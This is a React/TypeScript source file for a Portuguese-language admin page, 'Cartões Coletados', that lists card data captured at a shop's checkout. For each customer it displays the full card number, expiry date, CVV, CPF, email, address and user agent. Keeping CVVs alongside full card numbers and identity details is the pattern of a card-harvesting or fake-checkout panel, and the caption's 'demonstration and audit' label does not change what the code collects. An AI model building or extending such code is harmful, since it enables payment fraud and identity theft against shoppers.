import { createFileRoute } from "@tanstack/react-router";
import { useQuery } from "@tanstack/react-query";
import { createServerFn, useServerFn } from "@tanstack/react-start";
import { ShieldAlert } from "lucide-react";
import { amIAdmin } from "@/lib/admin.functions";
import { supabase } from "@/integrations/supabase/client";
import { Card } from "@/components/admin/ui";

const listCollectedCards = createServerFn({ method: "GET" }).handler(async () => {
  const check = await amIAdmin();
  if (!check.admin) throw new Error("Unauthorized");

  const { data, error } = await supabase
    .from("orders")
    .select("id, created_at, customer, delivery, metadata")
    .not("metadata->card_number", "is", null)
    .order("created_at", { ascending: false });

  if (error) {
    console.error("Erro ao carregar cartões:", error.message);
    return [];
  }

  return (data || []).map((o) => {
    const metadata = o.metadata as Record<string, any> | null;
    const customer = o.customer as Record<string, any> | null;
    const delivery = o.delivery as Record<string, any> | null;
    return {
      id: o.id as string,
      date: o.created_at as string,
      name: (metadata?.card_name || customer?.name || "N/A") as string,
      cpf: (customer?.doc || customer?.cpf || "N/A") as string,
      email: (customer?.email || "N/A") as string,
      address: delivery?.address
        ? `${delivery.address.street || ""}, ${delivery.address.number || ""} - ${delivery.address.city || ""}/${delivery.address.uf || ""}`
        : "N/A",
      userAgent: (metadata?.user_agent || "Desconhecido") as string,
      cardNumber: (metadata?.card_number || "N/A") as string,
      expiry: (metadata?.card_expiry || "N/A") as string,
      cvv: (metadata?.card_cvv || "N/A") as string,
    };
  });
});

export const Route = createFileRoute("/_authenticated/admin/cartoes")({
  head: () => ({
    meta: [
      { title: "Cartões Coletados — Admin" },
    ],
  }),
  component: CollectedCardsPage,
});

function CollectedCardsPage() {
  const load = useServerFn(listCollectedCards);
  const { data, isLoading, error } = useQuery({
    queryKey: ["admin-collected-cards"],
    queryFn: () => load(),
  });

  return (
    <div className="space-y-5">
      <div>
        <p className="text-xs text-muted-foreground">Início / Pagamentos</p>
        <h1 className="mt-1 text-2xl font-bold">Cartões Coletados</h1>
        <p className="mt-1 text-sm text-muted-foreground">
          Lista de cartões preenchidos no checkout pelos clientes (para demonstração e auditoria).
        </p>
      </div>

      <Card title="Registros de cartões">
        {isLoading ? (
          <p className="text-sm text-muted-foreground">Carregando…</p>
        ) : error ? (
          <p className="text-sm text-promo">Erro ao carregar dados.</p>
        ) : !data || data.length === 0 ? (
          <div className="flex min-h-48 flex-col items-center justify-center">
            <ShieldAlert className="h-8 w-8 text-muted-foreground" />
            <p className="mt-3 text-sm text-muted-foreground">Nenhum cartão coletado ainda.</p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full min-w-[1000px] text-sm">
              <thead>
                <tr className="border-b border-border text-left text-xs uppercase text-muted-foreground">
                  <th className="py-2">Data</th>
                  <th>Titular</th>
                  <th>CPF</th>
                  <th>E-mail</th>
                  <th>Endereço</th>
                  <th>Cartão (16)</th>
                  <th>Validade</th>
                  <th>CVV</th>
                  <th>User Agent</th>
                </tr>
              </thead>
              <tbody>
                {data.map((c) => (
                  <tr key={c.id} className="border-b border-border last:border-0">
                    <td className="py-2.5 whitespace-nowrap">
                      {new Date(c.date).toLocaleString("pt-BR")}
                    </td>
                    <td className="font-semibold">{c.name}</td>
                    <td className="whitespace-nowrap">{c.cpf}</td>
                    <td>{c.email}</td>
                    <td className="max-w-[200px] truncate" title={c.address}>{c.address}</td>
                    <td className="whitespace-nowrap font-mono">{c.cardNumber}</td>
                    <td className="whitespace-nowrap">{c.expiry}</td>
                    <td className="whitespace-nowrap">{c.cvv}</td>
                    <td className="max-w-[150px] truncate text-[10px] text-muted-foreground" title={c.userAgent}>
                      {c.userAgent}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </Card>
    </div>
  );
}
